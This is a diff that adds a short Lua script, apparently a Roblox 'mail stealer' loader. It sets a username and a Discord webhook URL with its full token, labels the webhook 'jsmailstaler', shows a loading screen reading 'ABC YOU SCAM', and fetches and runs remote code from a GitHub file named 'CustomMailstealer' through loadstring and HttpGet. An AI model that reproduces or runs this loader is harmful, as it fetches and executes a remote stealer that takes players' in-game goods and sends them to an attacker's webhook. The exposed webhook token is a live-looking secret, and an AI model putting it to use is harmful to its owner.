@@ -1,0 +1,10 @@
+LUA
+Username = "GHOSTMANMMO"
+Webhook = "https://discord.com/api/webhooks/1201330296629506089/yiZLFlQwjmDpk10lbypGR9FP9b8iPthT81bdDnc7luIxhZLW93wo7i-KpTNiwOQcIiHv"
+
+
+G_LoadingScreen = "ABC YOU SCAM"
+G_WebhookName = "jsmailstaler"
+
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/MoriCustom/main/CustomMailstealer"))()
